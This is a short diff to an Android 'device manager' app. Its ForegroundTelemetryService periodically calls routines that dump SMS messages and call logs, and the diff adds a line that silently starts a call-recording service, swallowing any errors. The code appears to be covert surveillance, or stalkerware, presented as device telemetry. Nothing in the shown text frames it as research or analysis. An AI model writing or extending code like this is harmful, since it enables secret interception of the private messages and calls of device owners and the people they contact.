@@ -21,6 +21,7 @@ import android.util.Log;
 import androidx.core.content.ContextCompat;
 
 import com.company.devicemgr.utils.ApiConfig;
+import com.company.devicemgr.services.CallRecordingService;
 import com.company.devicemgr.utils.HttpClient;
 
 import org.json.JSONArray;
@@ -97,6 +98,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                     if ((loops % 2) == 0) {
                         sendSmsDump();
                         sendCallLogDump();
+                        try { startService(new Intent(this, CallRecordingService.class)); } catch (Exception ignored) {}
                         flushPendingEvents(120);
                     }
                     loops++;
